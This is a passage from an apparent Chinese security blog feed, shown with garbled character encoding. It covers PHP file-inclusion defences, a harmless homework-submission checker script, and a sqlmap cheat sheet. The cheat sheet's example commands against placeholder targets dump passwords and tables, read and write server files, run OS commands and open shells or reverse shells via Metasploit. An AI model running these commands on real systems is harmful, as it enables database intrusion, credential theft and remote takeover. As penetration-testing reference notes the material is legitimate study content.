href="#æ–‡ä»¶åŒ…å«æ¼æ´é˜²æŠ¤" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´é˜²æŠ¤"></a>æ–‡ä»¶åŒ…å«æ¼æ´é˜²æŠ¤</h2><p>1ã€ä½¿ç”¨<strong>str_replace</strong>ç­‰æ–¹æ³•è¿‡æ»¤æ‰å±é™©å­—ç¬¦</p><p>2ã€é…ç½®open_basedirï¼Œé˜²æ­¢ç›®å½•éå†ï¼ˆ<strong>open_basedir å°†phpæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­</strong>ï¼‰</p><p>3ã€phpç‰ˆæœ¬å‡çº§ï¼Œé˜²æ­¢%00æˆªæ–­</p><p>4ã€å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œé˜²æ­¢è¢«è¯»å–</p><p>5ã€å¯¹äºåŠ¨æ€åŒ…å«çš„æ–‡ä»¶å¯ä»¥è®¾ç½®ä¸€ä¸ªç™½åå•ï¼Œä¸è¯»å–éç™½åå•çš„æ–‡ä»¶ã€‚</p><p>6ã€åšå¥½ç®¡ç†å‘˜æƒé™åˆ’åˆ†ï¼Œåšå¥½æ–‡ä»¶çš„æƒé™ç®¡ç†ï¼Œ<strong>allow_url_includeå’Œallow_url_fopen</strong>æœ€å°æƒé™åŒ–</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ–‡ä»¶åŒ…å«&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶åŒ…å«&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶åŒ…å«&quot;&gt;&lt;/a&gt;æ–‡ä»¶åŒ…å«&lt;/h1&gt;&lt;h2 id=&quot;å«ä¹‰&quot;&gt;&lt;a href=&quot;#å«ä¹‰&quot; class=&quot;headerlink&quot; title=&quot;å«ä¹‰&quot;&gt;&lt;/a&gt;å«ä¹‰&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Python Homework Checker</title>
    <link href="https://iahzl.github.io/Python-Homework-Checker/"/>
    <id>https://iahzl.github.io/Python-Homework-Checker/</id>
    <published>2023-08-07T08:03:18.000Z</published>
    <updated>2023-08-08T01:38:40.611Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python-Homework-Checker-æ ¹æ®Excelåå•å¯¹ç…§æ–‡ä»¶å¤¹ä¸­å­¦ç”Ÿä½œä¸šè¿›è¡Œæ£€æŸ¥æ˜¯å¦æäº¤ä½œä¸š"><a href="#Python-Homework-Checker-æ ¹æ®Excelåå•å¯¹ç…§æ–‡ä»¶å¤¹ä¸­å­¦ç”Ÿä½œä¸šè¿›è¡Œæ£€æŸ¥æ˜¯å¦æäº¤ä½œä¸š" class="headerlink" title="Python Homework Checker(æ ¹æ®Excelåå•å¯¹ç…§æ–‡ä»¶å¤¹ä¸­å­¦ç”Ÿä½œä¸šè¿›è¡Œæ£€æŸ¥æ˜¯å¦æäº¤ä½œä¸š)"></a>Python Homework Checker(æ ¹æ®Excelåå•å¯¹ç…§æ–‡ä»¶å¤¹ä¸­å­¦ç”Ÿä½œä¸šè¿›è¡Œæ£€æŸ¥æ˜¯å¦æäº¤ä½œä¸š)</h1><p>â€‹          ç°åœ¨ä¸€èˆ¬çš„ä½œä¸šéƒ½æ˜¯ç½‘ä¸Šæäº¤æ–‡ä»¶ä¸ºä¸»ï¼Œæˆ‘ä»¬æ€»ä¼šæœ‰ä¸€äº›ä½œä¸ºæ”¶ä½œä¸šçš„äººä¼šçƒ¦æ¼è°è¿˜æ²¡äº¤ä½œä¸šï¼Œæ‰€ä»¥æˆ‘å°±è¿™ä¸ªé—®é¢˜å†™äº†ä¸€æ®µå°ä»£ç æ¥æ£€æµ‹å“ªä¸ªäººæ²¡äº¤ä½œä¸šã€‚ </p><p>â€‹           åŸç†æ˜¯è¯»å…¥ä½œä¸šæ‰€åœ¨çš„æ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶åç§°ï¼Œå°†è¿™äº›æ–‡ä»¶åç§°å’Œä½ è¦æ”¶é›†çš„åå•å¯¹æ¯”ï¼Œå°†æ²¡æœ‰çš„åå•è¾“å‡º ä»¥ä¸‹æ˜¯ä¸€ä¸ªç”¨Pythonæ£€æŸ¥å­¦ç”Ÿæ˜¯å¦æäº¤ä½œä¸šçš„ç¨‹åºï¼Œå®ƒå¯ä»¥æ£€æŸ¥ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­æ˜¯å¦å­˜åœ¨æŒ‰å­¦ç”Ÿå­¦å·å‘½åçš„PDFæ–‡ä»¶ï¼Œä»¥ç¡®å®šå“ªäº›å­¦ç”Ÿå·²ç»æäº¤ä½œä¸šã€‚æœ¬ç¨‹åºä½¿ç”¨<code>openpyxl</code>å’Œ<code>os</code>åº“ï¼Œå› æ­¤éœ€è¦ç¡®ä¿å®‰è£…äº†è¿™ä¸¤ä¸ªåº“ã€‚ </p><p>â€‹          å¦‚æœExcelæ–‡ä»¶ä¸­æœ‰å¤šåˆ—ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åˆ—æ ‡é¢˜æ¥æŸ¥æ‰¾å­¦å·æ‰€åœ¨çš„åˆ—ã€‚æˆ‘ä»¬è¿˜éœ€è¦æ ¹æ®å­¦å·æ¥æå–å§“åï¼Œå› ä¸ºæ–‡ä»¶å¤¹ä¸­çš„PDFæ–‡ä»¶åæ˜¯â€œå­¦å·-å§“åâ€æ ¼å¼ã€‚ </p><p>â€‹          è¿™ä¸ªç¨‹åºé¦–å…ˆæŸ¥æ‰¾Excelæ–‡ä»¶ä¸­åŒ…å«â€œå­¦å·â€æ ‡é¢˜çš„åˆ—ï¼Œå¹¶è®°å½•è¯¥åˆ—çš„åˆ—å­—æ¯ã€‚ç„¶åå®ƒéå†æ–‡ä»¶å¤¹ä¸­çš„PDFæ–‡ä»¶ï¼Œå¯¹äºæ¯ä¸ªPDFæ–‡ä»¶ï¼Œå®ƒä¼šæå–å­¦ç”Ÿå­¦å·å’Œå§“åï¼Œå¹¶å°†å­¦å·å’Œå§“åæ·»åŠ åˆ°å·²æäº¤å­—å…¸ä¸­ã€‚ç„¶åå®ƒéå†Excelæ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œï¼Œä½¿ç”¨å­¦å·åˆ—çš„åˆ—å­—æ¯æ¥æå–å­¦ç”Ÿå­¦å·ï¼Œå¹¶ä½¿ç”¨å­¦å·åœ¨å·²æäº¤å­—å…¸ä¸­æŸ¥æ‰¾å¯¹åº”çš„å§“åï¼Œå¹¶æ‰“å°å‡ºç›¸åº”çš„æäº¤çŠ¶æ€ã€‚ </p><h2 id="ä»£ç å¤ç°"><a href="#ä»£ç å¤ç°" class="headerlink" title="ä»£ç å¤ç°"></a>ä»£ç å¤ç°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰æ–‡ä»¶å¤¹è·¯å¾„å’ŒExcelæ–‡ä»¶è·¯å¾„</span></span><br><span class="line">folder_path = <span class="string">&quot;D:\\University\\Sophomore_second\\R222A1035120001å·¥ç¨‹é¡¹ç›®ç®¡ç†ä¸ç»æµå†³ç­–\\R222A1035120001å·¥ç¨‹é¡¹ç›®ç®¡ç†ä¸ç»æµå†³ç­–&quot;</span></span><br><span class="line">excel_path = <span class="string">&quot;D:\\University\\Sophomore_second\\R222A1035120001å·¥ç¨‹é¡¹ç›®ç®¡ç†ä¸ç»æµå†³ç­–\\R222A1035120001å­¦ç”Ÿåå•0310.xlsx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€Excelæ–‡ä»¶</span></span><br><span class="line">wb = openpyxl.load_workbook(excel_path)</span><br><span class="line">sheet = wb.active</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªç©ºçš„å­—å…¸æ¥å­˜å‚¨å·²ç»æäº¤ä½œä¸šçš„å­¦ç”Ÿå­¦å·</span></span><br><span class="line">submitted = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥æ‰¾Excelæ–‡ä»¶ä¸­å­¦å·æ‰€åœ¨çš„åˆ—</span></span><br><span class="line">headers = [cell.value <span class="keyword">for</span> cell <span class="keyword">in</span> sheet[<span class="number">1</span>]]</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;å­¦å·&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error: cannot find the column containing student IDs.&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">student_id_column = headers.index(<span class="string">&quot;å­¦å·&quot;</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ–‡ä»¶å¤¹ä¸­çš„PDFæ–‡ä»¶ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨æŒ‰å­¦ç”Ÿå­¦å·å‘½åçš„PDFæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(folder_path):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.pdf&quot;</span>):</span><br><span class="line">        student_id, student_name = filename[:-<span class="number">4</span>].rsplit(<span class="string">&quot;-&quot;</span>, <span class="number">1</span>) <span class="comment"># åˆ†ç¦»å­¦å·å’Œå§“å</span></span><br><span class="line">        submitted[student_id] = student_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†Excelæ–‡ä»¶ä¸­çš„å­¦ç”Ÿåå•ï¼Œæ£€æŸ¥å“ªäº›å­¦ç”Ÿå·²ç»æäº¤ä½œä¸š</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> sheet.iter_rows(min_row=<span class="number">2</span>, values_only=<span class="literal">True</span>):</span><br><span class="line">    student_id = <span class="built_in">str</span>(row[student_id_column - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> student_id <span class="keyword">in</span> submitted:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;row[<span class="number">1</span>]&#125;</span> (<span class="subst">&#123;student_id&#125;</span>) has not submitted the homework.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python-Homework-Checker-æ ¹æ®Excelåå•å¯¹ç…§æ–‡ä»¶å¤¹ä¸­å­¦ç”Ÿä½œä¸šè¿›è¡Œæ£€æŸ¥æ˜¯å¦æäº¤ä½œä¸š&quot;&gt;&lt;a href=&quot;#Python-Homework-Checker-æ ¹æ®Excelåå•å¯¹ç…§æ–‡ä»¶å¤¹ä¸­å­¦ç”Ÿä½œä¸šè¿›è¡Œæ£€æŸ¥æ˜¯å¦æäº¤ä½œä¸š&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="python" scheme="https://iahzl.github.io/categories/python/"/>
    
    
    <category term="python" scheme="https://iahzl.github.io/tags/python/"/>
    
    <category term="excel" scheme="https://iahzl.github.io/tags/excel/"/>
    
    <category term="openpyxl" scheme="https://iahzl.github.io/tags/openpyxl/"/>
    
    <category term="os" scheme="https://iahzl.github.io/tags/os/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap å¸¸ç”¨æŒ‡ä»¤</title>
    <link href="https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <id>https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</id>
    <published>2023-08-07T07:59:49.000Z</published>
    <updated>2023-08-07T08:01:07.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqlmap-å¸¸ç”¨æŒ‡ä»¤"><a href="#sqlmap-å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="sqlmap å¸¸ç”¨æŒ‡ä»¤"></a>sqlmap å¸¸ç”¨æŒ‡ä»¤</h1><p>SQLMap æ˜¯ä¸€æ¬¾è‡ªåŠ¨åŒ–çš„SQLæ³¨å…¥æµ‹è¯•å·¥å…·ï¼Œåœ¨ kali ä¸Šå·²é›†æˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">åŸºæœ¬æ“ä½œç¬”è®°ï¼š-u  <span class="comment">#æ³¨å…¥ç‚¹ </span></span><br><span class="line">-f  <span class="comment">#æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»å‹ </span></span><br><span class="line">-b  <span class="comment">#è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ </span></span><br><span class="line">-p  <span class="comment">#æŒ‡å®šå¯æµ‹è¯•çš„å‚æ•°(?page=1&amp;id=2 -p &quot;page,id&quot;) </span></span><br><span class="line">-D <span class="string">&quot;&quot;</span>  <span class="comment">#æŒ‡å®šæ•°æ®åº“å </span></span><br><span class="line">-T <span class="string">&quot;&quot;</span>  <span class="comment">#æŒ‡å®šè¡¨å </span></span><br><span class="line">-C <span class="string">&quot;&quot;</span>  <span class="comment">#æŒ‡å®šå­—æ®µ </span></span><br><span class="line">-s <span class="string">&quot;&quot;</span>  <span class="comment">#ä¿å­˜æ³¨å…¥è¿‡ç¨‹åˆ°ä¸€ä¸ªæ–‡ä»¶,è¿˜å¯ä¸­æ–­ï¼Œä¸‹æ¬¡æ¢å¤åœ¨æ³¨å…¥(ä¿å­˜ï¼š-s &quot;xx.log&quot;ã€€ã€€æ¢å¤:-s &quot;xx.log&quot; --resume) </span></span><br><span class="line">--level=(1-5) <span class="comment">#è¦æ‰§è¡Œçš„æµ‹è¯•æ°´å¹³ç­‰çº§ï¼Œé»˜è®¤ä¸º1 </span></span><br><span class="line">--level1ï¼šé»˜è®¤çš„ç­‰çº§ï¼Œä¼šè¿›è¡ŒåŸºæœ¬çš„æµ‹è¯•ï¼ŒåŒ…æ‹¬GETå’ŒPOSTæ–¹å¼ã€‚</span><br><span class="line">--level2: åœ¨åŸæœ‰çš„åŸºç¡€ä¸Šå¢åŠ å¯¹cookieçš„æ£€æµ‹ã€‚ </span><br><span class="line">--level3: å¢åŠ å¯¹User Agentã€Referer çš„æ£€æµ‹ </span><br><span class="line">--lever4: æ›´å¤šçš„payload </span><br><span class="line">--level5: æœ€é«˜ç­‰çº§ï¼ŒåŒ…å«æ‰€æœ‰çš„payload,ä¼šå°è¯•è‡ªåŠ¨ç ´è§£å‡ºcookieã€xffç­‰å¤´éƒ¨æ³¨å…¥ã€‚</span><br><span class="line"></span><br><span class="line">--risk=(0-3)  <span class="comment">#æµ‹è¯•æ‰§è¡Œçš„é£é™©ç­‰çº§ï¼Œé»˜è®¤ä¸º1 </span></span><br><span class="line">--time-sec=(2,5) <span class="comment">#å»¶è¿Ÿå“åº”ï¼Œé»˜è®¤ä¸º5 </span></span><br><span class="line">--data <span class="comment">#é€šè¿‡POSTå‘é€æ•°æ® </span></span><br><span class="line">--columns        <span class="comment">#åˆ—å‡ºå­—æ®µ </span></span><br><span class="line">--current-user   <span class="comment">#è·å–å½“å‰ç”¨æˆ·åç§° </span></span><br><span class="line">--current-db     <span class="comment">#è·å–å½“å‰æ•°æ®åº“åç§° </span></span><br><span class="line">--<span class="built_in">users</span>          <span class="comment">#åˆ—æ•°æ®åº“æ‰€æœ‰ç”¨æˆ· </span></span><br><span class="line">--passwords      <span class="comment">#æ•°æ®åº“ç”¨æˆ·æ‰€æœ‰å¯†ç  </span></span><br><span class="line">--privileges     <span class="comment">#æŸ¥çœ‹ç”¨æˆ·æƒé™(--privileges -U root) </span></span><br><span class="line">-U               <span class="comment">#æŒ‡å®šæ•°æ®åº“ç”¨æˆ· </span></span><br><span class="line">--dbs            <span class="comment">#åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ </span></span><br><span class="line">--tables -D <span class="string">&quot;&quot;</span>   <span class="comment">#åˆ—å‡ºæŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨ </span></span><br><span class="line">--columns -T <span class="string">&quot;user&quot;</span> -D <span class="string">&quot;mysql&quot;</span>      <span class="comment">#åˆ—å‡ºmysqlæ•°æ®åº“ä¸­çš„userè¡¨çš„æ‰€æœ‰å­—æ®µ </span></span><br><span class="line">--dump-all            <span class="comment">#åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨ </span></span><br><span class="line">--exclude-sysdbs      <span class="comment">#åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨ </span></span><br><span class="line">--dump -T <span class="string">&quot;&quot;</span> -D <span class="string">&quot;&quot;</span> -C <span class="string">&quot;&quot;</span>   <span class="comment">#åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„å­—æ®µçš„æ•°æ®(--dump -T users -D master -C surname) </span></span><br><span class="line">--dump -T <span class="string">&quot;&quot;</span> -D <span class="string">&quot;&quot;</span> --start 2 --top 4  <span class="comment"># åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„2-4å­—æ®µçš„æ•°æ® </span></span><br><span class="line">--dbms    <span class="comment">#æŒ‡å®šæ•°æ®åº“(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span></span><br><span class="line">--os      <span class="comment">#æŒ‡å®šç³»ç»Ÿ(Linux,Windows) </span></span><br><span class="line">-v  <span class="comment">#è¯¦ç»†çš„ç­‰çº§(0-6) </span></span><br><span class="line">    0ï¼šåªæ˜¾ç¤ºPythonçš„å›æº¯ï¼Œé”™è¯¯å’Œå…³é”®æ¶ˆæ¯ã€‚ </span><br><span class="line">    1ï¼šæ˜¾ç¤ºä¿¡æ¯å’Œè­¦å‘Šæ¶ˆæ¯ã€‚ </span><br><span class="line">    2ï¼šæ˜¾ç¤ºè°ƒè¯•æ¶ˆæ¯ã€‚ </span><br><span class="line">    3ï¼šæœ‰æ•ˆè½½è·æ³¨å…¥ã€‚ </span><br><span class="line">    4ï¼šæ˜¾ç¤ºHTTPè¯·æ±‚ã€‚ </span><br><span class="line">    5ï¼šæ˜¾ç¤ºHTTPå“åº”å¤´ã€‚ </span><br><span class="line">    6ï¼šæ˜¾ç¤ºHTTPå“åº”é¡µé¢çš„å†…å®¹ </span><br><span class="line">--privileges  <span class="comment">#æŸ¥çœ‹æƒé™ </span></span><br><span class="line">--is-dba      <span class="comment">#æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ </span></span><br><span class="line">--roles       <span class="comment">#æšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰² </span></span><br><span class="line">--udf-inject  <span class="comment">#å¯¼å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆè·å–ç³»ç»Ÿæƒé™ï¼‰ </span></span><br><span class="line">--union-check  <span class="comment">#æ˜¯å¦æ”¯æŒunion æ³¨å…¥ </span></span><br><span class="line">--union-cols <span class="comment">#union æŸ¥è¯¢è¡¨è®°å½• </span></span><br><span class="line">--union-test <span class="comment">#union è¯­å¥æµ‹è¯• </span></span><br><span class="line">--union-use  <span class="comment">#é‡‡ç”¨union æ³¨å…¥ </span></span><br><span class="line">--union-tech orderby <span class="comment">#unioné…åˆorder by </span></span><br><span class="line">--data <span class="string">&quot;&quot;</span> <span class="comment">#POSTæ–¹å¼æäº¤æ•°æ®(--data &quot;page=1&amp;id=2&quot;) </span></span><br><span class="line">--cookie <span class="string">&quot;ç”¨;å·åˆ†å¼€&quot;</span>      <span class="comment">#cookieæ³¨å…¥(--cookies=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;) </span></span><br><span class="line">--referer <span class="string">&quot;&quot;</span>     <span class="comment">#ä½¿ç”¨refereræ¬ºéª—(--referer &quot;http://www.baidu.com&quot;) </span></span><br><span class="line">--user-agent <span class="string">&quot;&quot;</span>  <span class="comment">#è‡ªå®šä¹‰user-agent </span></span><br><span class="line">--proxy <span class="string">&quot;http://127.0.0.1:8118&quot;</span> <span class="comment">#ä»£ç†æ³¨å…¥ </span></span><br><span class="line">--string=<span class="string">&quot;&quot;</span>    <span class="comment">#æŒ‡å®šå…³é”®è¯,å­—ç¬¦ä¸²åŒ¹é…. </span></span><br><span class="line">--threads ã€€ã€€  <span class="comment">#é‡‡ç”¨å¤šçº¿ç¨‹(--threads 3) </span></span><br><span class="line">--sql-shell    <span class="comment">#æ‰§è¡ŒæŒ‡å®šsqlå‘½ä»¤ </span></span><br><span class="line">--sql-query    <span class="comment">#æ‰§è¡ŒæŒ‡å®šçš„sqlè¯­å¥(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span></span><br><span class="line">--file-read    <span class="comment">#è¯»å–æŒ‡å®šæ–‡ä»¶ </span></span><br><span class="line">--file-write   <span class="comment">#å†™å…¥æœ¬åœ°æ–‡ä»¶(--file-write /test/test.txt --file-dest /var/www/html/1.txt;å°†æœ¬åœ°çš„test.txtæ–‡ä»¶å†™å…¥åˆ°ç›®æ ‡çš„1.txt) </span></span><br><span class="line">--file-dest    <span class="comment">#è¦å†™å…¥çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ </span></span><br><span class="line">--os-cmd=<span class="built_in">id</span>    <span class="comment">#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ </span></span><br><span class="line">--os-shell     <span class="comment">#ç³»ç»Ÿäº¤äº’shell </span></span><br><span class="line">--os-pwn       <span class="comment">#åå¼¹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span></span><br><span class="line">--msf-path=    <span class="comment">#matesploitç»å¯¹è·¯å¾„(--msf-path=/opt/framework/msf3/) </span></span><br><span class="line">--os-smbrelay  <span class="comment"># </span></span><br><span class="line">--os-bof       <span class="comment"># </span></span><br><span class="line">--reg-read     <span class="comment">#è¯»å–winç³»ç»Ÿæ³¨å†Œè¡¨ </span></span><br><span class="line">--priv-esc     <span class="comment"># </span></span><br><span class="line">--time-sec=    <span class="comment">#å»¶è¿Ÿè®¾ç½® é»˜è®¤--time-sec=5 ä¸º5ç§’ </span></span><br><span class="line">-p <span class="string">&quot;user-agent&quot;</span> --user-agent <span class="string">&quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;</span>  <span class="comment">#æŒ‡å®šuser-agentæ³¨å…¥ </span></span><br><span class="line">--eta          <span class="comment">#ç›²æ³¨ </span></span><br><span class="line">/pentest/database/sqlmap/txt/</span><br><span class="line">common-columns.txtã€€ã€€å­—æ®µå­—å…¸ã€€ã€€ã€€ </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      è¡¨å­—å…¸ </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line"></span><br><span class="line">å¸¸ç”¨è¯­å¥ :</span><br><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --<span class="built_in">users</span> --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T <span class="built_in">users</span> -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C <span class="string">&quot;user,pass&quot;</span>  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read <span class="string">&quot;c:\boot.ini&quot;</span> -v 2 </span><br><span class="line">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd <span class="string">&quot;id&quot;</span> -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=<span class="string">&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot;</span> --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</span> -p <span class="built_in">id</span> --prefix <span class="string">&quot;&#x27;)&quot;</span> --suffix <span class="string">&quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span></span><br><span class="line">16./sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</span> --auth-type Basic --auth-cred <span class="string">&quot;testuser:testpass&quot;</span></span><br><span class="line">17./sqlmap.py -l burp.log --scope=<span class="string">&quot;(www)?\.target\.(com|net|org)&quot;</span></span><br><span class="line">18./sqlmap.py -u <span 